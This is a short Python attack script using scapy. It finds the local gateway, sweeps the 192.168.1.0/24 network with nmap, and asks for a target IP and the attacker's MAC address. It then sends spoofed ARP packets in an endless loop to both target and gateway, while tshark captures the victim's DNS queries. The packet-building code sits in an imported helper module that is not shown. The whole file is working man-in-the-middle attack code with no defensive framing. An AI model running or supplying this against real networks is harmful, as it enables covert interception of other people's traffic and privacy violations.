from scapy.all import *
import spoof_function as fct
import os
from multiprocessing import Process
import logging


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

print("[**] Here the gateway ip/mac adress\n")
gateway_ip= conf.route.route("0.0.0.0")[2]
gateway_mac = getmacbyip(gateway_ip)
print("[**] IP adress of the gateway ",gateway_ip, " and the mac adress ", gateway_mac)

print("[+] Here, are the IP adress in your network\n")
os.system('nmap -sn 192.168.1.0/24')
print("\n")


print("[**] Enter the ip adress of the target")
target_ip = str(input("[**] Enter the target IP HERE --> "))
target_mac = getmacbyip(target_ip)
print("MAC, adress of the target", target_mac)
attacker_mac= str(input("[**] Enter your MAC adress HERE --> "))
print("[***] Performing of the ARP spoofing [***]\n")


total = fct.spoof_target(gateway_ip,target_ip,target_mac,attacker_mac)
total1 = fct.spoof_gateway(gateway_ip,target_ip,attacker_mac,gateway_mac)

print("[***] Sniffing of the DNS packets [***]\n")

def shell_sniff():
        os.system('tshark -f "host <ADRESS IP TARGET>" | grep DNS')

def send_packet(total,total1):
        while True:
                sendp(total, verbose=False)
                sendp(total1, verbose=False)


if __name__=='__main__':
        p1 = Process(target = send_packet,args=(total,total1))
        p2 = Process(target = shell_sniff)
        p1.start()
        p2.start()
